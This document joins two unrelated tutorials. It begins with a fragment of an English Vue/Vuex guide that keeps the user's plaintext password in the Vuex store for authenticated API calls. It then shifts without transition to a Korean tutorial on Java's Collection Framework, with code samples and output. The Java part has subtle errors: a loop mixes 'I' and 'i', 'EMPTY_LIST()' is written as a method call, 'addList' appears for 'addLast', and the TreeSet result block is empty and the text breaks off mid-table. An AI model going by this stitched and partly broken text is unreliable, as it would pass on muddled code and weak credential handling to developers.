    mutations: {
        login_success(state, payload){
            state.loginSuccess = true;
            state.userName = payload.userName;
            state.userPass = payload.userPass;
        },
    ...
    },
    actions: {
        login({commit}, {user, password}) {
            ...
                            // place the loginSuccess state into our vuex store
                            commit('login_success', {
                                userName: user,
                                userPass: password
                            });
            ...
    getters: {
        isLoggedIn: state => state.loginSuccess,
        hasLoginErrored: state => state.loginError,
        getUserName: state => state.userName,
        getUserPass: state => state.userPass
    }
```

> Be sure to use the current way to define and [interact with vuex mutations](https://vuex.vuejs.org/guide/mutations.html). Lot's of blog posts are using an old way of committing multiple parameters like `commit('auth_success', token, user)`. This DOES NOT work anymore. Only the first parameter will be set, the others are lost! 

Now inside our [Protected.vue](frontend/src/components/Protected.vue), we can use the stored credentials to access our `/secured` endpoint:

```
<script>
  import api from './backend-api'
  import store from './../store'

export default {
  name: 'protected',

  data () {
    return {
      backendResponse: '',
      securedApiCallSuccess: false,
      errors: null
    }
  },
  methods: {
    getSecuredTextFromBackend() {
      api.getSecured(store.getters.getUserName, store.getters.getUserPass)
              .then(response => {
                console.log(""Response: '"" + response.data + ""' with Statuscode "" + response.status);
                this.securedApiCallSuccess = true;
                this.backendResponse = response.data;
              })
              .catch(error => {
                console.log(""Error: "" + error);
                this.errors = error;
              })
    }
  }
}
```

Feel free to create a nice GUI based on `securedApiCallSuccess`, `backendResponse` and `errors` :)

# Collection Framework의 기본 개념



# 1. 자바의 자료구조


Java는 기본타입(원형, Primitive 타입 또는 원시형이라고도 한다)의 자료 이외에도 String 이나 배열(참조형 타입, Reference Type)이 존재한다.
참조형 타입은 객체의 메모리 주소를 참조하여 데이터를 처리하며, 클래스 기반으로 생성된다. 예를 들어, String은 자바의 기본 라이브러리에 포함된 클래스로 문자열을 표현하고 다루고, 배열도 참조형 타입에 속하며 여러 개의 값을 연속적인 메모리 공간에 저장하여 관리하고자 할때 사용된다. 이러한 참조형 타입은 힙 메모리 영역에 할당되고, 가비지 컬렉션의 대상이 된다.
이 밖에도 데이터를 효율적으로 저장하고 처리할 수 있는 Collection 타입도 존재한다.

![그림 1](./image/1.png)


콜렉션 프레임워크는 java.util 패키지 안에 위치하며, 여러 인터페이스와 이를 구현하는 클래스로 구성 되어있다. 
주요 컬렉션 인터페이스는 다음과 같다:

> - List: 순서가 있는 데이터의 집합을 다루며, 데이터 중복을 허용. ArrayList, LinkedList 등이 있다.
> - Set: 순서를 유지하지 않고, 중복을 허용하지 않는 데이터 집합. HashSet, LinkedHashSet, TreeSet 등이 있다.
> - Queue: FIFO(First In First Out) 방식 또는 우선 순위에 따라 데이터를 처리하는 인터페이스. LinkedList, PriorityQueue등이 이에 속한다.
> - Map: 키(Key)와 값(Value)의 쌍으로 데이터를 저장. 키는 중복될 수 없으며, 각 키는 하나의 값만을 가리킨다. HashMap, TreeMap, LinkedHashMap 등이 있다.

콜렉션 프레임워크에 대해서는 본 문서에서 중점적으로 설명한다. 

설명에 앞서 배열을 먼저 살펴보자.  

기본적으로 int 타입이나 String 타입의 자료들을 여러건 담기 위해서는 배열을 선언하여 사용하게 된다.

아래의 샘플코드를 살펴보자

```java
int[] ids;
int[] ids = new int[5];

String[] userInfoArray = new String[10];
String[] userInfoArray = new String[] {""one"", ""two""};
```

위의 구문은 배열의 선언부이다.

배열의 길이를 확인하기 위해서는 **int arrayLength = userInfoArray.length;** 와 같이 사용하여 확인할 수 있습니다.

배열의 요소에 대해서는 반복 접근을 통해 확인 할 수 있다.

```java
for (int I = 0; I < userInfoArray.length; i++) {
    String s = userInfoArray[i];
}
```

또, System.arraycopy(src, srcPos, dest, destPos, length)와 같은 메서드를 통해 배열을 복사 할 수 있으며, java.util.Arrays.sort 를 이용하여 정렬을 수행할 수 도 있다.

배열을 쓰는 이유는 아래와 같다.

- 데이터 접근과 사용이 매우 효율적(특정 요소에 대한 접근이 매우 빠름)
- Type-safe : 배열에 선언된 데이터 타입만 추가될수 있음
- 구현이 간단함

반면, 단점은 아래와 같다.

- 고정 크기, 복사와 크기 재조정에 오버헤드 존재
- 배열안에 몇 개의 데이터가 있는지 일일이 검사해야함
- 콜렉션에 비해 제한된 기능, 좀 더 범용적인 기능이 필요함

이 같은 이유 때문에 좀 더 다이내믹한 데이터 타입인 Collection을 정확히 이해하고 사용하는 것을 알아보고자 한다.

# 2. Collection 인터페이스

Collection은 객체들을 모아둔 자료 구조체를 나타내는 개념이다.

모든 Collection의 상위 인터페이스로써 Collection들이 갖고 있는 핵심 메서드를 선언한다.

List 와 Set 인터페이스가 모두 Collection 인터페이스를 상속하고 있으므로 핵심적인 자료구조에서의 연산이 Collection 인터페이스에 정의 되어 있음을 알수 있다

Collection 동작 방식을 이해하려면 Collection 인터페이스가 정의하는 메서드들을 살펴보는 것이 가장 좋을 것이다.
이 인터페이스는 java.util 패키지에 위치해 있으며, 컬렉션을 다루기 위한 다음과 같은 주요 메소드를 포함하고 있다.

> - boolean add(E e): 지정된 요소를 컬렉션에 추가한다.
> - boolean remove(Object o): 지정된 요소를 컬렉션에서 제거한다.
> - boolean contains(Object o): 지정된 요소가 컬렉션에 포함되어 있는지 여부를 반환한다.
> - int size(): 컬렉션 내의 요소 수를 반환한다.
> - boolean isEmpty(): 컬렉션이 비어 있는지 여부를 반환한다.
> - Iterator<E> iterator(): 컬렉션의 요소를 반복하는 데 사용할 반복자를 반환한다.
> - void clear() : 컬랙션을 비운다. 


Collection 하위로 Set 계열(`TreeSet`, `SortedSet`, `LinkedHashSet`, `HashSet`)과 List 계열(`ArrayList`, `LinkedList`, `Vector`)등이 있으며 이와는 별도로 Map 계열(`SortedMap`, `TreeMap`, `HashMap`, `Hashtable`)이 존재한다.
<br>
Map은 Collection을 확장하지 않았지만 Collection의 한 부분으로 분류하여 사용한다.

이 외에도 Queue와 Deque가 있다.(큐와 덱의 차이나 구현 방법에 해서는 책에 더 자세히 설명 되어있다.)



![그림 2](./image/2.png)

아래의 이미지를 통해 Collection 인터페이스의 전반적인 상속과 구현에 대해서 이해할 수 있을 것이다.
주요 구현 클래스들은 다음과 같다.


![그림 3](./image/3-1.png)

> ArrayList: 크기 조절이 가능한 배열로 구현된 리스트.
>
> LinkedList: 이중 연결 리스트로 구현된 리스트 및 큐.
>
> HashSet: 해시 테이블에 의해 구현된 집합.
>
> LinkedHashSet: 순서를 유지하는 해시 테이블에 의해 구현된 집합.
>
> TreeSet: 이진 검색 트리에 의해 구현된 정렬된 집합.
>
> PriorityQueue: 우선순위 힙에 의해 구현된 큐.
>
> ArrayDeque: 배열을 기반으로 한 덱.
>

## 2-1 List 인터페이스



Collection 인터페이스를 확장한 자료형으로 요소들의 순서를 저장하여 색인(Index)을 사용하여 특정 위치에 요소를 삽입하거나 접근할 수 있다. 중복을 허용하고 인덱스로 접근한다. 가변형 배열과 비슷하다.

정리하면 다음과 같다. 

> 순서 유지: 요소가 삽입된 순서를 유지한다. <br>
> 인덱스 기반 접근: 인덱스를 사용하여 특정 위치의 요소에 접근할 수 있다. <br>
> 중복 허용: 동일한 요소를 여러 번 저장할 수 있다.


- List로 사용할 수 있는 클래스 : ArrayList, LinkedList , Vector 등이 존재한다.
- ArrayList
  - 내부적으로 동적 배열을 사용한다.
      - 상당히 빠르고 크기를 마음대로 조절할 수 있는 배열
      - 요소의 접근 속도가 빠르며, 랜덤 엑세스가 효율적이다.
  - 단방향 포인터 구조로 자료에 대한 순차적인 접근에 강점이 있음

- Vector
    - ArrayList의 구형 버전. 모든 메서드가 동기화되어 있음(thread safe)
    - 느려서 잘 쓰이진 않음
- LinkedList
    - 이중 연결 리스트로 구현 
    - 양방향 포인터 구조로 데이터의 삽입, 삭제가 빈번할 경우 빠른 성능을 보장.
      - 요소의 접근 속도는 상대적으로 느림 
    - 스택, 큐, 양방향 큐 등을 만들기 위한 용도로 쓰임
- CopyOnWriteArrayList
  - 쓰기 시 새로운 배열을 생성하여 스레드에 안전한 리스트를 구현
  -   읽기 작업은 매우 빠르지만, 쓰기 작업은 상대적으로 느림.


다음의 활용 코드를 살펴보자. (src 하위의 java/main에서 각 인터페이스들의 메서드를 사용한 예제들을 확인할 수 있다. com.codevillains.collection.method 패키지 참조 )

```java
/**
 * @author CodeVillains
 * @description : ArrayList 전체 메서드 기능을 사용해본다. 
 */
package com.codevillains.collection.method;

import java.util.ArrayList;
import java.util.List;
import java.util.ListIterator;

public class ArrayListMethodExample {
  public static void main(String[] args) {
    // List 인터페이스를 ArrayList 구현 클래스로 사용
    List<String> list = new ArrayList<>();

    // 요소 추가
    list.add(""Apple"");
    list.add(""Banana"");
    list.add(""Cherry"");
    System.out.println(""최초 list: "" + list);

    // 요소 삽입
    list.add(1, ""Orange"");
    System.out.println(""요소 삽입 인덱스 1,  'Orange' : "" + list);

    // 컬렉션 추가
    List<String> additionalFruits = new ArrayList<>();
    additionalFruits.add(""Grape"");
    additionalFruits.add(""Watermelon"");
    list.addAll(additionalFruits);
    System.out.println(""collection 추가 : "" + list);

    System.out.println(""2번째 요소 가져오기 : "" + list.get(2));

    // 요소 수정
    list.set(2, ""Grapes"");
    System.out.println(""2번째 요소 변경 : "" + list);

    // 요소 삭제 (인덱스로)
    String removedElement = list.remove(3);
    System.out.println(""3번째 요소 삭제: "" + removedElement);
    System.out.println(""3번째 요소 삭제 후 collection: "" + list);

    // 요소 삭제 (객체로)
    boolean isRemoved = list.remove(""Banana"");
    System.out.println(""바나나 삭제 여부: "" + isRemoved);
    System.out.println(""바나나 삭제 후 collection: "" + list);

    // 리스트 크기
    System.out.println(""List 사이즈: "" + list.size());

    // 리스트 비어 있는지 확인
    System.out.println(""리스트가 비어있는지 확인? "" + list.isEmpty());

    // 요소 포함 여부 확인
    boolean containsApple = list.contains(""Apple"");
    System.out.println(""사과과 포함되어 있나? "" + containsApple);

    // 리스트 반복
    System.out.println(""list iterating :"");
    for (String fruit : list) {
      System.out.println(fruit);
    }

    // 리스트 반복자 사용
    ListIterator<String> listIterator = list.listIterator();
    System.out.println(""list 반복자 사용 :"");
    while (listIterator.hasNext()) {
      System.out.println(listIterator.next());
    }

    // 하위 리스트 가져오기
    List<String> subList = list.subList(1, 3);
    System.out.println(""SubList index 1부터 3까지: "" + subList);

    // 리스트 초기화
    list.clear();
    System.out.println(""list 초기화: "" + list);
    System.out.println(""리스트가 비어있나? "" + list.isEmpty());
  }
}

```
각 메서드에 대해서 이해하는 것은 어렵지 않을 것이다. 

## 2-2 Set 인터페이스


집합을 정의하며 요소의 중복을 허용하지 않는다. 스스로 정의한 메서드는 없다. (상위 메서드를 사용)

- Set 으로 사용할 수 있는 클래스 : HashSet, LinkedHashSet, TreeSet등이 존재.
- HashSet
    - 가장 빠른 임의 접근 속도
    - 순서를 전혀 예측할 수 없음
- LinkedHashSet
    - 추가된 순서, 또는 가장 최근에 접근한 순서대로 접근 가능
- TreeSet
    - 정렬된 순서대로 보관. 정렬 방법을 지정할 수 있음

# 3. Collection의 기본 생성 방법



Java 1.5 Generic 방식이 나온 후 로 아래와 같이 Collection을 생성할 수 있게 되었다.

```java
List<String> list= new ArrayList<String>();
List <String> userList= new ArrayList <String> (5);
Map<String, Object> userMap= new HashMap<String, Object> ();
Set<String> userSet= new HashSet<String> ();
```

위 방식은 Java 1.5 버전이 나오고 Generic 가 추가 된 이후 코드라서 예시로써 작성했지만 현재의 코드 준수 솔루션은 `java.util.Collections` 를 사용하는 것이다.

일반적인 빈 Collection 객체를 반환해야 한다면 아래의 코드를 사용하여 리턴해줄 수 있다.

```java
List<User> list = Collections.EMPTY_LIST();       // 비권장  
Map<String, Object> maps = Collections.EMPTY_MAP; // 비권장 
Set<String> sets = Collections.EMPTY_SET;         // 비권장 

// 1.5 Generic 으로 인하 List<T> 반환하기 때문에 타입 안정성을 보장할 수 있다.
List<User> collection1 = Collections.emptyList();
Map<String, String> collection2 = Collections.emptyMap();
Set<String> collection3 = Collections.emptySet();
```

List<User> list = Collections.EMPTY_LIST()의 경우 컴파일러가 타입 체크를 하지 않아 타입 불일치 문제나 에러가 발생할 여지가 있어서 Collections.emptyList()를 반환하는 것으로 권장한다. Collections.emptyList() 는 불변객체로써 값을 추가 할 수 없기 때문에 빈 객체를 리턴하는 경우에나 사용 가능하다.

아래의 Collections.java 구현 내용을 보면 금방 이해할 수 있을 것이다.

```java
public static final <T> List<T> emptyList() {
    return (List<T>) EMPTY_LIST;
}

...
public static final List EMPTY_LIST = new EmptyList<>();
```

Collections.EMPTY_LIST() 메서드가 반환하는 객체는 List 타입으로만 사용할 수 있다는 것을 확인 할 수 있다.

# 4. Collection 의 사용

Collection 인터페이스는 java.lang 패키지의 Iterable<T>를 extends 하고 있는 root 인터페이스로, List, Set, Queue와 Map 인터페이스를 통해 다양한 자료형을 제공하고 있다.

몇가지 주요 인터페이스에 대해서 정리해보면,

- List 인터페이스:
  List 인터페이스는 순서가 있는 요소의 집합을 나타내며, 중복 요소가 허용된다. List 인터페이스는 Collection 인터페이스를 확장하고 구현클래스로는 ArrayList, LinkedList, Vector 등이 있다.
- Set 인터페이스:
  Set 인터페이스는 중복되지 않는 요소의 집합을 나타내며, 순서는 유지되지 않는다. Set 인터페이스를 구현하는 클래스로는 HashSet, TreeSet 등이 있다.
- Queue 인터페이스:
  Queue 인터페이스는 요소의 삽입과 삭제가 발생하는 선입선출(FIFO) 구조의 컬렉션을 나타낸다. Queue 인터페이스를 구현하는 클래스로는 PriorityQueue, ArrayDeque 등이 있다.
- Map 인터페이스:
  Map 인터페이스는 키-값(key-value) 쌍으로 이루어진 요소의 집합을 나타낸다. Map 인터페이스는 Collection 인터페이스를 직접 확장하지는 않지만, Collection 인터페이스와 많은 공통 메서드를 공유한다. Map 인터페이스를 구현하는 클래스로는 HashMap, TreeMap 등이 있다.

아래는 각 인터페이스들을 확장한 자료형들의 사용방법에 대한 예제이다.

## 4-1 ArrayList 예제



ArrayList 클래스는 AbstractList를 확장하고 List 인터페이스를 구현하여 필요에 따라 길이가 늘어나는 동적 배열을 지원한다. (증가 감소 가능) ArrayList의 생성과 사용방법에 대해서 예제를 살펴보도록 하자.

```java
/**
 * @author CodeVillains
 * @description : ArrayList 간단 활용 데모 
 */
package com.codevillains.collection;

import java.util.ArrayList;
import java.util.List;

class ArrayListDemo {
	public static void main(String args[]) {

		// 배열 리스트를 만든다. 
		List<String> al = new ArrayList<>();
		System.out.println(""Initial size of al: "" + al.size());
		
		// 배열 리스트에 요소들을 추가한다. 
		al.add(""C""); 
		al.add(""A""); 
		al.add(""E"");
		al.add(""B"");
		al.add(""D"");
		al.add(""F"");
		al.add(1, ""A2"");  // index 1에 A2 값을 추가함 
		System.out.println(""Size of al after additions: "" + al.size());
		
		// 배열 리스트를 출력한다. 
		System.out.println(""Contents of al: "" + al);
		
		// 배열 리스트에서 요소들을 삭제한다. 
		al.remove(""F""); 
		al.remove(2);
		
		System.out.println(""Size of al after deletions: "" + al.size());
		System.out.println(""Contents of al: "" + al);
	}
}
```

위의 코드 10라인에서 String 타입의 ArrayList를 생성했다. List는 인터페이스이기 때문에 구현체를 통해 생성을 하였고 초기 값은 당연이 없으므로 size 를 반환하면 0이 리턴될 것이다.

20라인에서 애초에 추가한 요소 인덱스 1(인덱스는 0부터 시작)에 A2 라는 값을 추가 해주었고 출력해보면 인덱스 1 이후에 값은 순차적으로 밀린것을 확인할 수 있다.(삽입)

요소를 remove 하기 위해서는 값을 입력하거나 인덱스를 통해서 가능하게 된다.

결과는 아래와 같다.

```
Initial size of al: 0
Size of al after additions: 7
Contents of al: [C, A2, A, E, B, D, F]
Size of al after deletions: 5
Contents of al: [C, A2, E, B, D]
```

만약, 잘못된 요소에 접근할 경우 (이미 지운 값을 또 지우려 한다거나, 삽입되지 않은 값을 찾는다거나...) java.lang.IndexOutOfBoundsException 이 발생하게 된다.

ArrayList는 간단하게 toArray()를 통하여 배열로 변환할 수 있다.

아래의 예제를 살펴보자.

```java
/**
 * @author CodeVillains
 * @description : ArrayList to Array 
 */
package com.codevillains.collection;

import java.util.ArrayList;
import java.util.List;

class ArrayListToArray {
	public static void main(String args[]) {

		// 배열 리스트를 만든다. 
		List<Integer> al = new ArrayList<>();
		// 배열 리스트에 요소를 추가한다. 
		al.add(new Integer(1)); 
		al.add(new Integer(2));
		al.add(new Integer(3)); 
		al.add(new Integer(4));
		System.out.println(""Contents of al: "" + al); 
		
		// 배열을 얻는다. 
		Object ia[] = al.toArray(); 
		int sum=0;
		
		// 배열 요소들의 합계를 구한다. 
		for(int i=0; i<ia.length; i++){
			sum += ((Integer) ia[i]).intValue();
		}			
		
		System.out.println(""Sum is: "" + sum);
	}
}
```

18 라인에서 ArrayList 의 toArray를 통해 배열로 반환함을 확인 할 수 있다.

결과를 살펴보면 아래와 같다.

```
Contents of al: [1, 2, 3, 4]
Sum is: 10
```

ArrayList 의 주요 메서드는 아래와 같습니다. 굉장히 자주 사용되는 메서드이므로 꼭 기억해야 한다.

| 메서드 | 설명 |
| --- | --- |
| add(Object elem) | ArrayList에 요소를 추가 |
| remove(int index) | index 에 위치하는 요소 제거 |
| remove(Object elem) | elem과 일치하는 요소 제거 |
| contains(Object elem) | elem을 포함하고 있으면 true 아니면 false |
| isEmpty() | ArrayList 가 비어있으면 true 비어있지 않으면 false |
| indexOf(Object elem) | elem과 일치하는 요소의 index를 리턴, 없으면 -1 |
| size() | ArrayList의 요소의 개수를 리턴 |
| get(int index) | index에 위치한 요소를 리턴 |
| clear() | ArrayList를 비움(모든 요소를 삭제) |

## 4-2 LinkedList 예제

이 클래스는 AbstractSequentialList를 확장하고 List 인터페이스를 구현한다.

연결-리스트 자료 구조를 제공하고 리스트의 처음과 마지막에 요소를 삽입, 삭제할 수 있는 관련 메서드를 제공한다.

```java
/**
 * @author CodeVillains
 * @description : LinkedList
 */
package com.codevillains.collection;

import java.util.LinkedList;

public class LinkedListDemo {

	public static void main(String args[]) {
		// 링크드 리스트를 생성.
		LinkedList<String> ll = new LinkedList<String>();
		
		// 링크드 리스트에 요소를 추가한다. 
		ll.add(""F""); 
		ll.add(""B""); 
		ll.add(""D"");
		ll.add(""E""); 
		ll.add(""C""); 
		ll.addLast(""Z""); 
		ll.addFirst(""A"");
		
		ll.add(1, ""A2""); 
		
		System.out.println(""Original contents of ll: "" + ll);
		
		// 링크드 리스트에서 요소를 삭제한다.
		ll.remove(""F""); 
		ll.remove(2);
		
		System.out.println(""Contents of ll after deletion: "" + ll);
		
		// 첫 번째와 마지막 요소를 삭제한다. 
		ll.removeFirst(); 
		ll.removeLast(); 
		System.out.println(""ll after deleting first and last: "" + ll);
		
		// 값을 가져오고 값을 설정한다. 
		Object val = ll.get(2); 
		ll.set(2, (String) val + "" Changed"");
		
		System.out.println(""ll after change: "" + ll);	
	}
}
```

실행 결과는 아래와 같다.

```
Original contents of ll: [A, A2, F, B, D, E, C, Z]
Contents of ll after deletion: [A, A2, D, E, C, Z]
ll after deleting first and last: [A2, D, E, C]
ll after change: [A2, D, E Changed, C]
```

실제 LinkedList가 implements 받은 Interface는 List, Deque, Cloneable 정도 인데, List의 주요 메서드들을 사용할 수 있기 때문에 요소의 추가 삭제등은 동일하게 사용할 수 있다.

눈여겨 볼만한 주요 메서드는 addFirst, addList, getFirst, getLast, removeFirst, removeLast 등 이다.

랜덤하게 특정한 인덱스를 호출하여 데이터를 가져올 경우 혹은 삭제할 경우 ArrayList가 성능상으로 좀 더 좋고, LinkedList는 리스트의 처음과 끝에 요소를 제거하거나 삽입하기에 더 큰 잇점이 있다

Set 인터페이스 예제를 설명하기 전에, Collection 인터페이스를 구현한 클래스들에 대해서 간단히 정리하고 넘어가보자.

**Collection 인터페이스를 구현한 클래스**

- AbstractCollection : Collection 인터페이스의 대부분을 구현한다.
- AbstractList : AbstractCollection을 확장하고 List 인터페이스의 대부분을 구현한다.
- AbstractSequentialList : 요소들에 무작위 접근보다는 순차적인 접근을 사용하는 컬렉션을 사용하기 위해서 AbstractList를 확장한다.
- LinkedList : AbstractSequentialList를 확장함으로써 링크드 리스트를 구현 한다.
- ArrayList : AbstractList를 확장함으로써 동적 배열을 구현한다.
- AbstractSet : AbstractCollection을 확장하고 Set 인터페이스의 대부분을 구현한다.
- HashSet : 해시 테이블과 함께 사용하기 위해서 AbstractSet을 확장한다.
- LinkedHashSet : 삽입 순서가 있는 반복을 허용하기 위해 HashSet을 확장한다.
- TreeSet : 트리에 저장된 집합을 구현한다. AbstractSet을 확장한다.

## 4-3 HashSet 예제


HashSet 클래스는 AbstractSet을 확장하고 Set 인터페이스를 구현한다.

HashSet은 기억장소로 해시 테이블을 사용하는 컬렉션을 만들고, 해시 테이블을 해싱(hashing)이라 불리는 기술을 사용해서 정보를 저장한다. 중복을 허용하지 않고, 해싱을 하는 과정이 보통의 정렬된 집합을 생성하는데 알맞지 않기 때문에 요소들의 순서를 보장해주지 않는다.

아래는 간단한 예제이다.

```java
/**
 * @author CodeVillains
 * @description : HashSet 데모 
 */
package com.codevillains.collection;

import java.util.HashSet;
import java.util.Set;

public class HashSetDemo {

	public static void main(String args[]) {
		// 해시 집합을 생성한다. 
		Set<String> hs = new HashSet<>();
		// 해시 집합에 요소를 추가한다. 
		hs.add(""B""); 
		hs.add(""A""); 
		hs.add(""D"");
		hs.add(""E""); 
		hs.add(""C""); 
		hs.add(""F"");
		
		System.out.println(hs);
	}
}
```

보통의 경우 순서를 보장하지 않기 때문에 무작위로 나올 것을 기대하지만 사용하는 자바 플랫폼에 따라서 내부 구현에 의해 오름차순으로 출력되는 경우도 발생할 수 있으나 이는 Java 나 HashSet의 클래스 명세에 보장하는 것은 아니다. 만약 요소의 순서가 보장되는 것이 중요하다면 LinkedHashSet 클래스를 사용해야 한다.

LinkedHashSet 클래스는 내부 구현이 해시 테이블과 연결 리스트를 결합한 것으로, 요소들이 추가된 순서를 유지한다. 따라서 LinkedHashSet 클래스를 사용하면 요소들이 추가된 순서대로 출력되는 것을 보장할 수 있다.

## 4-4 LinkedHashSet 예제



HashSet을 확장했지만 자신의 메서드는 추가되지 않는다. 위에 설명한데로 HashSet과는 다르게 삽입된 순서대로 반복 출력이 가능하다.

```java
/**
 * @author CodeVillains
 * @description : LinkedHashSet
 */
package com.codevillains.collection;

import java.util.LinkedHashSet;
import java.util.Set;

class LinkedHashSetDemo {
	public static void main(String[] args) {
		Set<String> linkHashSet = new LinkedHashSet<String>();
		linkHashSet.add(""B"");
		linkHashSet.add(""A"");
		linkHashSet.add(""D"");
		linkHashSet.add(""E"");
		linkHashSet.add(""C"");
		linkHashSet.add(""F"");
		System.out.println(linkHashSet);
	}
}
```

처리결과

```
[B, A, D, E, C, F]
```

## 4-5 TreeSet 예제

트리를 사용하는 Set 인터페이스의 구현을 제공한다.

오름차순 정렬로 저장되며 많은 양의 데이터를 저장하는데 효과적이고 검색속도가 매우 빠르다는 장점이 있다.

```java
/**
 * @author CodeVillains
 * @description : TreeSet 데모 
 */
package com.codevillains.collection;

import java.util.Set;
import java.util.TreeSet;

public class TreeSetDemo {
	public static void main(String[] args) {
		// 트리 집합을 만든다. 
		Set<String> ts = new TreeSet<String>();
		// 트리 집합에 요소들을 추가한다. 
		ts.add(""C""); 
		ts.add(""A""); 
		ts.add(""B"");
		ts.add(""E""); 
		ts.add(""F""); 
		ts.add(""D"");
		System.out.println(ts);
	}
}
```

처리결과

```

# 5. Map
Map은 Key-Value 쌍의 데이터를 저장하는 인터페이스이다. Key를 통해 Value를 검색하고 추가, 삭제하는 등의 작업을 수행할 수 있다.

Map 인터페이스를 구현하는 클래스로는 HashMap, TreeMap 등이 있고 특징은 아래와 같다.

- HashMap : 순서를 보장하지 않지만, 검색과 추가, 삭제 등의 작업에서 매우 빠르게 처리할 수 있다.
- TreeMap : 정렬된 순서로 데이터를 처리할 수 있지만, 검색과 추가, 삭제 등의 작업에서는 HashMap보다 느릴 수 있다.
- LinkedHashMap : 데이터의 추가 순서를 유지한다. HashMap보다는 느리지만 데이터 추가 순서를 보장할 수 있는 장점이 있다.
- WeakHashMap : Key가 가비지 컬렉션의 대상이 될 때마다 해당 Key와 Value가 자동으로 삭제된다. 메모리 누수를 방지하기 위해 사용된다.
- EnumMap : EnumMap은 Key가 Enum 타입인 Key-Value 쌍의 데이터를 저장하는 맵 구조를 제공한다. Key가 Enum 타입이기 때문에 (내부적으로 ordinal이라는 순차적인 정수값을 가지므로) 키 순서가 보장된다.

Map은 쉽게 생각하면 사물함의 열쇠와 같은 개념이라고 볼 수 있다. 사물함의 번호와 키가 일치하면 해당 키로 사물함을 열고, 물건을 넣거나 빼올 수 있을 것이다.
를
사물함이 방대하다면 키에 사물함의 번호만 확인 가능하게 해주면 원하는 위치로 바로 가서 사물함을 조작할 수 있기 때문에 속도측면에서 이득을 가질 것이다.

- 하나의 사물함 열쇠가 다른 사물함까지 열수 있다면 이것은 문제가 되듯 Map에서도 키는 유일(Unique) 해야한다.
- Map에는 순서가 없다 - List와 Set이 순서나 집합적인 개념의 인터페이스라면 Map은 검색의 개념이 가미된 인터페이스이다.
- Map 인터페이스는 데이터를 삽입할 때 Key와 Value의 형태로 삽입되며, Key를 이용해서 Value를 얻을 수 있다.
- Map은 순서가 없다.

간단한 사용 예제 코드를 살펴보자.

```java
/**
 * @author CodeVillains
 * @description : Map 데모 
 */
package com.codevillains.collection;

import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public class MapDemo {

	public static void main(String[] args) {
		Map<Integer, String> map = new HashMap<Integer, String>();
		
		// Key : 회원번호 , value : 이름 - map.put을 이용하여 데이터를 저장한다. 
		map.put(1, ""홍길동이"");
		map.put(2, ""Samsig"");
		map.put(3, ""Harunote"");
		map.put(100, ""Kakao"");

		System.out.println(map);
		System.out.println(map.get(100));

		// 값 찾기 (Key 혹은 Value) 존재하면 True
		System.out.println(map.containsKey(3));
		System.out.println(map.containsValue(""Samsig""));

		
		// 키를 Set에 담기, Key는 Integer 로 정의 되어있다. 
		Set<Integer> keys = map.keySet();
		System.out.println(keys);

		
		// 값을 Collection에 담기, Value는 String으로 정의 되어있다. 
		Collection<String> values = map.values();
		System.out.println(values);

	}
}

```

처리 결과를 살펴보자.

```
{1=홍길동이, 2=Samsig, 3=Harunote, 100=Kakao}
Kakao
true
true
[1, 2, 3, 100]
[홍길동이, Samsig, Harunote, Kakao]
```

Map 은 Key 와 Value 의 쌍으로 데이터 타입이 정의 되어있고, Key는 중복될 수 없다고 했다.

물론, Key 에 대응하는 Object 타입의 빈을 정의 해서 사용해도 무방하다.

예를들어 UserVO의 UserName 과 UserMail 주소로 키가 형성이 된다면 `map.put(new UserVO(UserName, UserMail), value)` 형태로도 키를 구성할 수 있다.

맵과 관련된 주요 인터페이스는 아래와 같다.

맵은 컬렉션 인터페이스를 구현하지 않기 때문에 컬렉션은 아니지만 entrySet 메서드를 이용하여 맵의 컬렉션 뷰를 얻을 수 있다.

만약 key의 컬렉션 뷰를 얻기 위해서는 keySet 메서드를 이용하면 됩니다. 값에 대한 콜렌션 뷰는 values 메서드로 가능하다.

| 인터페이스 | 설명 |
| --- | --- |
| Map | 유일한 키와 값을 연결(map)한다. |
| Map.Entry | 맵에 있는 요소(키/값 쌍)을 표현한다. Map 인터페이스의 내부 클래스이다. |
| SortedMap | 키를 오름차순으로 유지하기 위해서 Map 인터페이스를 확장한다. |

## 5-1 Map과 관련된 클래스들



AbstractMap이 모든 실제 맵 구현의 최상위 클래스이다.

| 클래스 | 설명 |
| --- | --- |
| AbstractMap | Map 인터페이스의 대부분을 구현한다. |
| HashMap | 해시 테이블을 사용하기 위해서 AbstractMap을 확장한다. |
| TreeMap | 트리를 사용하기 위해서 AbstractMap을 확장한다. |
| WeakHashMap | 취약 키(weak key)를 갖는 해시 테이블을 사용하기 위해서 AbstractMap을 확장한다. |
| LinkedHashMap | 삽입-순서 반복을 허용하기 위해서 HashMap을 확장한다. |
| IdentityHashMap | AbstractMap을 확장하고 요소(document)를 비교할 때 참조가 같은지 비교한다. |

## 5-2 HashMap 클래스



Map인터페이스를 구현하기 위해 해시테이블을 사용한 클래스로. 중복을 허용하지 않고 순서를 보장하지 않는다.

Map인터페이스를 구현한 클래스 중에서 가장 많이 쓰인다*.*

key 또는 value 값으로써 null이 허용된다.

```java
/**
 * @author CodeVillains
 * @description : HashMap 데모 
 */
package com.codevillains.collection;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

public class HashMapDemo {

	public static void main(String args[]) {
		// 해시 맵을 만든다. 
		Map<String, Double> hm = new HashMap<String, Double>();
		// 맵에 요소들을 넣는다. 
		hm.put(""홍길동이"", new Double(1240.34)); 
		hm.put(""김영순이"", new Double(223.39)); 
		hm.put(""퀵군"", new Double(1378.00)); 
		hm.put(""글라이더님"", new Double(9999.55)); 
		hm.put(""존 도"", new Double(-122.08));
		hm.put(""한효주님"", null);
		
		// 맵 엔트리의 컬렉션 집합을 가져온다. 
		Set<?> set = hm.entrySet();
		
		// 반복자를 얻는다. 
		Iterator<?> i = set.iterator();
		
		// 요소들을 출력한다. 
		while(i.hasNext()) {
			Map.Entry me = (Map.Entry)i.next();
			System.out.print(me.getKey() + "": "");
			System.out.println(me.getValue());
		} 
		
		// 존 도의 계좌에 1000을 예금한다. 
		double bonus = hm.get(""존 도"").doubleValue(); 
		hm.put(""존 도"", new Double(bonus + 1000)); 
		System.out.println(""존 도's new deposit: "" + hm.get(""존 도""));
		
	}
}

```

처리결과는 아래와 같다.

```
퀵군: 1378.0
한효주님: null
홍길동이: 1240.34
글라이더님: 9999.55
존 도: -122.08
김영순이: 223.39
존 도's new deposit: 877.92
```

HashMap 의 주요 메서드는 아래와 같다.

| 메서드 | 설명 |
| --- | --- |
| void clear() | HashMap에 저장된 모든 객체를 제거. |
